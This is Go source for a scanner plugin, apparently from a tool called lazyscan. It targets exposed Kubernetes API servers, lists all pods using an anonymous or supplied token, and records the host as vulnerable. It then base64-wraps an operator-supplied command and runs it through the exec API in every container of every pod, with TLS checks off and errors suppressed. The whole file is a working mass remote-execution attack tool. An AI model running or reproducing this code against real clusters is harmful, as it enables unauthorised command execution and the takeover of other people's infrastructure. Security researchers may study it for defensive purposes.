package plugins

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"log"
	"net/url"
	"strings"

	"github.com/404tk/lazyscan/common"
	"github.com/404tk/lazyscan/pkg/schema"
	"github.com/tidwall/gjson"
	"k8s.io/client-go/rest"
	"k8s.io/client-go/tools/remotecommand"
)

type KubeAPIConfig struct {
	Command string
	Config  *rest.Config
}

func KubeAPIServerScan(info *common.HostInfo) (bool, error) {
	config := getConfig(info.Host, info.Port, info.Token)

	opts := schema.K8sRequestOption{
		Token:    info.Token,
		Endpoint: fmt.Sprintf("https://%s:%s", info.Host, info.Port),
		Api:      "/api/v1/pods",
		Method:   "GET",
	}
	resp, err := schema.ServerAccountRequest(opts)
	if err != nil || !strings.Contains(resp, "items") {
		return false, err
	}
	pods := gjson.Get(resp, "items").Array()
	result := fmt.Sprintf("[%s:%s] There are %d pods in the cluster.",
		info.Host, info.Port, len(pods))
	log.Println(result)
	if info.Queue != nil {
		vuln := common.Vuln{
			Host: info.Host,
			Port: info.Port,
		}
		if info.Token == "" {
			vuln.Unauth = true
		} else {
			vuln.Token = info.Token
		}
		info.Queue.Push(vuln)
	}

	// batch command execution
	cmd := info.Command.TCPCommand
	if cmd != "" {
		b64 := base64.StdEncoding.EncodeToString([]byte(cmd))

		var kubeconf = &KubeAPIConfig{
			Command: fmt.Sprintf("echo %s | base64 -d | sh", b64),
			Config:  config,
		}
		for _, p := range pods {
			pn := p.Get("metadata.name").String()
			ns := p.Get("metadata.namespace").String()
			for _, c := range p.Get("spec.containers").Array() {
				// 批量pods执行时忽略报错
				api := fmt.Sprintf(opts.Endpoint+
					"/api/v1/namespaces/%s/pods/%s/exec"+
					"?container=%s&command=%2Fbin%2Fsh&command=-c&command=%s&stderr=true&stdin=true&stdout=true",
					ns, pn, c.Get("name").String(), url.QueryEscape(cmd))
				kubeconf.kubeAPIExec(pn, ns, c.Get("name").String(), api)
			}
		}
	}
	return true, err
}

func (conf *KubeAPIConfig) kubeAPIExec(podName, namespace, container, api string) {
	u, err := url.ParseRequestURI(api)
	executor, err := remotecommand.NewSPDYExecutor(conf.Config, "POST", u)
	if err != nil {
		return
	}
	// 使用bytes.Buffer变量接收标准输出和标准错误
	var stdout, stderr bytes.Buffer
	executor.Stream(remotecommand.StreamOptions{
		Stdin:  strings.NewReader(""),
		Stdout: &stdout,
		Stderr: &stderr,
	})
}

func getConfig(ip, port, token string) *rest.Config {
	return &rest.Config{
		Host:        fmt.Sprintf("https://%s:%s/", ip, port),
		BearerToken: token,
		TLSClientConfig: rest.TLSClientConfig{
			Insecure: true, // 设置为true时 不需要CA
			// CAData: []byte(ca_crt),
		},
	}
}
